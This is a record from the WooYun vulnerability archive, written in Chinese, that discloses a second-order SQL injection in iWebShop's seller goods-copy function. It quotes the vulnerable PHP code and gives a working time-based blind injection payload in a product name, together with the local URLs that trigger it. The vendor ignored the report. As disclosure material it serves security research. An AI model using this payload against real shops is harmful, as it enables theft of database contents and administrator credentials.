{"id": 29085, "wybug_id": "wooyun-2015-0120499", "wybug_title": "iwebshop最新版二次注入", "wybug_corp": "www.jooyea.cn", "wybug_author": "路人曱", "wybug_date": "2015-06-17 15:38", "wybug_open_date": "2015-09-20 15:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-22：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向公众公开  简要描述： rt 详细说明：  iwebshop最新版一枚二次注入 条件略微苛刻漏洞文件:/controllers/seller.php\n//商品复制\tfunction goods_copy()\t{\t\t$idArray = explode(',',IReq::get('id'));\t\t$idArray = IFilter::act($idArray,'int');\t\t$goodsDB     = new IModel('goods');\t\t$goodsAttrDB = new IModel('goods_attribute');\t\t$goodsPhotoRelationDB = new IModel('goods_photo_relation');\t\t$productsDB = new IModel('products');\t\t$goodsData = $goodsDB->query('id in ('.join(',',$idArray).') and is_share = 1 and is_del = 0 and seller_id = 0','*');\t\tif($goodsData)\t\t{\t\t\tforeach($goodsData as $key => $val)\t\t\t{\t\t\t\t//判断是否重复\t\t\t\tif( $goodsDB->getObj('seller_id = '.$this->seller['seller_id'].' and name = \"'.$val['name'].'\"') )\t\t\t\t{\t\t\t\t\tdie('商品不能重复复制');\t\t\t\t}\n重要代码：\n$goodsData = $goodsDB->query('id in ('.join(',',$idArray).') and is_share = 1 and is_del = 0 and seller_id = 0','*');\t\tif($goodsData)\t\t{\t\t\tforeach($goodsData as $key => $val)\t\t\t{\t\t\t\t//判断是否重复\t\t\t\tif( $goodsDB->getObj('seller_id = '.$this->seller['seller_id'].' and name = \"'.$val['name'].'\"') )\n把从goods查询出来的$goodsData foreach $val['name']放入查询  造成二次注入但是$goodsData 查询出来需要 完成下面查询 然而 seller_id 和 is_share 都是后台管理操作的 需要管理更改 略显鸡肋 \n$goodsData = $goodsDB->query('id in ('.join(',',$idArray).') and is_share = 1 and is_del = 0 and seller_id = 0','*');\n证明一下即可   漏洞证明：  http://127.0.0.1/iwebshop/index.php?controller=seller&action=goods_edit商品名称 \" or if(ascii(substr(user(),1,1))=114,sleep(5),1)#\n\n记录下id 此处id=6然后还需管理更改那2个属性http://127.0.0.1/iwebshop/index.php?controller=seller&action=goods_copy&id=6\n\n成功延时 \n\n此处盲注略显太慢 其实从上面语句可以发现 在这个操作下面  还有个insert操作 那里即可二次注入完整取出管理密码   修复方案：  出来再次过滤   版权声明：转载请注明来源 路人曱@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-20 15:40 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}